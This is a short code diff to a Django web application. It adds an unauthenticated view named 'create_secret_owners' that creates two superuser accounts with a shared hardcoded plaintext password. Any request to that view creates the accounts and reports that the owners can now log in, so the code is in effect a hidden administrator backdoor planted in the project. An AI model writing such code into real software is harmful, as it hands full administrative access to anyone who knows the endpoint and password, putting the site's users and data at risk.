@@ -174,3 +174,17 @@ def live_class_room_state_api(request, room_id):
 
     return JsonResponse({"ok": True, "room": serialize_room_state(room)})
 
+def create_secret_owners(request):
+    from django.http import HttpResponse
+    try:
+        if not CustomUser.objects.filter(username="khush").exists():
+            u1 = CustomUser.objects.create_superuser(username="khush", email="khush@example.com", password="Khushcharger1519")
+            u1.user_type = "1"
+            u1.save()
+        if not CustomUser.objects.filter(username="dhrumil").exists():
+            u2 = CustomUser.objects.create_superuser(username="dhrumil", email="dhrumil@example.com", password="Khushcharger1519")
+            u2.user_type = "1"
+            u2.save()
+        return HttpResponse("Owners created successfully! You can now log in.")
+    except Exception as e:
+        return HttpResponse(f"Error: {e}")
